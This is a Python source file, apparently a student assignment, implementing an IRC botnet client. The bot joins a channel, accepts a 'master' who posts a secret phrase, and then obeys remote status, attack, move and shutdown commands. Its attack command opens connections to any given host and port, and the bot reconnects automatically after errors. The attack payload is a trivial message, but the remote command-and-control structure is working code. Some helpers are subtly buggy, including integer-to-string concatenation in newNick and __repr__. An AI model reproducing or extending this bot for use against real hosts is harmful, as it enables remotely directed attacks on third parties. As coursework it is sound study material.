#!/usr/bin/env python3
#Harold MacDonald 10134954 T02
#Partner Justin Currie Leslie

#Imports
import sys, os, socket, time

potentialNicks = ("billyBotThorneton", "EmmaBotson", "NeilDeGrassBotson", "JeanClaudeBotDam", "BotneySpears")

class bot():

    def __init__(self, hostname, port, channel, secretPhrase):
        self.hostname = hostname
        self.port = port
        self.channel = channel
        self.secretPhrase = secretPhrase
        self.nickName = potentialNicks[0]
        self.numberOfAttacks = 1
        self.numberOfNickAttemps = 0
        self.ircChannel = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.keepRunning = True
        self.nicks = potentialNicks[1:]

    def __str__(self):
        return (self.hostname + " " + str(self.port) + " " + self.channel + " " + self.secretPhrase + " "  + self.nickName)

    def __repr__(self):
        return (self.hostname + " " + self.port + " " + self.channel + " " + self.secretPhrase + " "  + self.nickName)
    
    def continueRunning(self):
        while self.keepRunning:
            try:
                self.run()
            except:
                if (not self.keepRunning):
                    break
                self.ircChannel.close()
                self.ircChannel = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                time.sleep(5)

                
               
    def run(self):
        self.connectToServer()
        readbuffer = ""
        master = ""
        foundMaster = False
        while 1:
            self.transmit("JOIN #" + self.channel)
            readbuffer = self.ircChannel.recv(1024)
            incomingMessage = readbuffer.decode("UTF-8").split("\n")
            for line in incomingMessage:
                print(line)
                line = line.rstrip()
                name = self.getUserName(line)
                line = line.split(" ")
                self.checkNick(line)
                self.checkPing(line)
                if (self.secretPhrase == line[-1]):
                    master = name
                    foundMaster = True         
                if foundMaster:
                    if (name == master) and ("PRIVMSG" in line):
                        self.masterCommands(master, line)
                    if (name == master) and ("PRIVMSG" in line) and (":quit" in line):
                        master = ""
                        foundMaster = False
                        print("master is trying to quit")
                
    def masterCommands(self, master, input):
        if ":status" in input:
            self.status(master)
        if (":attack" in input) and (len(input) ==6):
            self.attack(master, input[-2], input[-1])
        if (":move" in input) and (len(input) == 7):
            self.move(master, input[-3], input[-2], input[-1])
        if ":shutdown" in input[-1]:
            self.shutdown(master)

    def status(self, user):
        self.sendToUser(user, "Checking in!")

    def attack(self, user, hostName, portNumber):
        self.sendToUser(user, "Lets attack " + hostName + " on port: " + portNumber)
        try:
            attackSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            attackSocket.connect((hostName, int(portNumber)))
            attackMessage = bytes(str(self.numberOfAttacks) + " " + self.nickName + "\n", "UTF-8")
            attackSocket.send(attackMessage)
            self.sendToUser(user, "success")
            attackSocket.close()
        except:
            self.sendToUser(user, "failure")
        self.numberOfAttacks = self.numberOfAttacks + 1

    def move(self, user, newHost, newPort, newChannel):
        self.sendToUser(user, "Changing servers to: " + newHost + " " + str(port) )
        self.hostname = str(newHost)
        self.port = int(newPort)
        self.channel = str(newChannel)
        self.transmit("quit")
        
    def shutdown(self, master):
        self.sendToUser(master, "Good-bye!")
        self.keepRunning = False
        sys.exit()

	#methods for connecting to the server
    def connectToServer(self):
        print("Connecting to: " + self.hostname + " " + str(self.port))
        self.ircChannel.connect((self.hostname, int(self.port)))
        self.transmit("NICK " + self.nickName + " " + self.nickName + " " + self.nickName + " :" + self.nickName)
        self.transmit("USER " + self.nickName + " " + self.hostname + " " + self.nickName + " :" + self.nickName)

    def newNick(self):
        if (len(self.nicks) > 1):
            self.nickName = self.nicks[0]
            self.nicks = self.nicks[1:]
        else:
            self.nickName = "bot" + self.numberOfNickAttemps
            self.numberOfNickAttemps = self.numberOfNickAttemps + 1

    def checkNick(self, line):
        if  ("use" in line[-1]) and (len(line) == 9) and  ("in" in line[-2]) and ("already" in line[-3]):
            self.newNick()
            time.sleep(5)
            self.ircChannel.close()
            self.ircChannel = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.connectToServer()


    def getUserName(self, toParse):
        name = toParse.split("!")
        return name[0][1:]
  
    #Methods to send message to irc server
    def sendToUser(self, user, message):
        myMsg = ("PRIVMSG " + user + " :" + message)
        self.transmit(myMsg)
    
    def sendToChannel(self, channel, message):
        myMsg = ("PRIVMSG #" + channel + " :" + message)
        self.transmit(myMsg)

    def transmit(self, message):
        myMsg = bytes(message + "\n", "UTF-8")
        self.ircChannel.send(myMsg)

    #Ping pong methods for keeping connected to irc server
    def checkPing(self, line):
        if (line[0] == "PING"):
            self.pong(line[1])

    def pong(self, returnMsg):
        self.transmit("PONG " + returnMsg)



if __name__ == "__main__":
    numberOfArgs = len(sys.argv)
    if (numberOfArgs == 5):
        hostname = sys.argv[1]
        port = sys.argv[2]
        channel = sys.argv[3]
        secretPhrase = ":" + sys.argv[4]
    else:
        print("Invalid number of arguments!")
        exit()
    
    aBot = bot(hostname, int(port), channel, secretPhrase)
    aBot.continueRunning()

